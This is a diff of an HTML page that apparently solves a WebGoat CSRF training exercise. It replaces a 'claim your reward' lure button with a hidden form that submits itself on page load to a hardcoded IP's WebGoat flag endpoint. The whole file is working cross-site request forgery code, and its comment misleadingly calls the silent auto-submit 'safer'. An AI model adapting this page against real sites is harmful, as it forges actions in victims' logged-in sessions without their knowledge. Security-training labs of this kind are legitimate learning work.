@@ -1,13 +1,16 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>CSRF Exploit</title>
-</head>
 <body>
-<h1>Click the button below to claim your reward</h1>
+<h1>CSRF Angriff wird ausgeführt...</h1>
 
-<form action="http://54.164.244.190:8080/WebGoat/csrf/basic-get-flag" method="GET" target="_blank">
-    <input type="submit" value="Submit Request">
+<form id="csrfForm" action="http://18.212.222.12:8080/WebGoat/csrf/basic-get-flag" method="POST">
+    <input type="hidden" name="csrf" value="true">
+    <input type="hidden" name="someOtherName" value="Submit">
 </form>
+
+<script>
+    // Wir nutzen hier eine sicherere Methode, um das Formular abzusenden
+    document.forms['csrfForm'].submit();
+</script>
 </body>
 </html>
